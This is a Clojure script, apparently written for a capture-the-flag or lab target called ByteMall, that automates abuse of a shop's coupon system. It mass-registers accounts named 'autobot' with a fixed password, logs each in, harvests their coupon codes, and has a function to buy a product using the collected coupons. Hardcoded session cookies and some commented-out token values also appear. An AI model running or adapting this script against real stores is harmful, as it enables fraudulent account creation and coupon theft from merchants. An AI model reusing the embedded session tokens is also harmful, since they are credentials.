(ns script.mall
  (:require
    [clojure.string :as str]
    [clojure.tools.logging :as log]
    [cheshire.core :as json]
    [clj-commons.byte-streams :as bs]
    [manifold.deferred :as d]
    [aleph.http :as http])
  (:gen-class))

(def ^:dynamic *host* "http://10.227.74.153:81")

(def default-headers
  {"Content-Type" "application/json; charset=utf-8"
   "Cookie"       "connect.sid=s%3A7j1e4j3sVX2hVh8QARS2UET2fRqaBnfk.27KalhzOGvFvQ5vGQ9EwL1Vpt6ACDhCbVGnegTrZT4M"
   "User-Agent"   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36"})

(defn wrap-headers [f]
  (fn [req]
    (let [headers (-> (:headers req)
                      (merge default-headers))]
      (f (assoc req :headers headers)))))

(defn wrap-logging [f]
  (fn [req]
    (log/info "request" req)
    (->
      (d/chain
        (f req)
        (fn [resp]
          (log/info "request OK" resp)
          resp))
      (d/catch
        Exception
        (fn [e]
          (log/error e "request failed")
          e)))))

(defn mws [f]
  (-> f
      wrap-logging
      wrap-headers))

(defn request [{:keys [url data params method headers]
                :or   {method  :get
                       headers {}}
                :as   req}]
  (log/info "request" req)
  (let [opts (transient
               {:request-method method
                :as             :json
                :url            (str *host* url)
                :middleware     mws})]
    (if data
      (assoc! opts :body (json/encode data)))
    ;; form-params
    (if params
      (assoc! opts :query-params params))
    (http/request (persistent! opts))))

(defn register [name passwd]
  (request {:method :post
            :url    "/api/user/register"
            :data   {:username name
                     :password passwd}}))

(defn login [name passwd]
  (request {:method :post
            :url    "/api/user/login"
            :data   {:username name
                     :password passwd}}))

(defn coupon [cookie]
  (d/chain
    (request {:url     "/api/coupon/list"
              :headers {"Cookie" cookie}})
    #(get-in % [:body :msg])
    first
    :code))

(defn buy [cookie pid coupons]
  (request {:method  :post
            :url     "/api/product/buy"
            :headers {"Cookie" cookie}
            :data    {:pid    pid
                      :coupon coupons}}))

(defn success? [resp]
  (= 200 (get-in resp [:body :code])))

(defn id-from-cookie [resp]
  (-> (get-in resp [:headers :set-cookie])
      (str/split #"; ")
      first))

(defn register-login-coupon [name passwd]
  (d/chain
    (register name passwd)
    (fn [resp]
      (when-not (success? resp)
        (log/errorf "register failed: %s %s" name passwd)))
    (fn [_] (login name passwd))
    (fn [resp]
      (if (success? resp)
        (coupon (id-from-cookie resp))
        (log/errorf "register failed: %s %s" name passwd)))
    (fn [code]
      (log/info "coupon=" code)
      code)
    ))

(defn get-coupons [s e]
  (loop [n s res []]
    (if (>= n e)
      res
      (recur
        (inc n)
        (conj res @(register-login-coupon (str "autobot" n) "abcd1234"))))))

; connect.sid=s%3Ahupa9speGNlOS5DLtaEOzGmn9JWZOFcO.Wsi0oaGDOTvuO5j1otFR%2BTv06dKq91z175IlwYlYrr0
; 60f50c54e6bd1a82f0609db4
; S9R837 [2201123] OD1K

(defn -main [& args]
  (log/info "hello ByteMall"))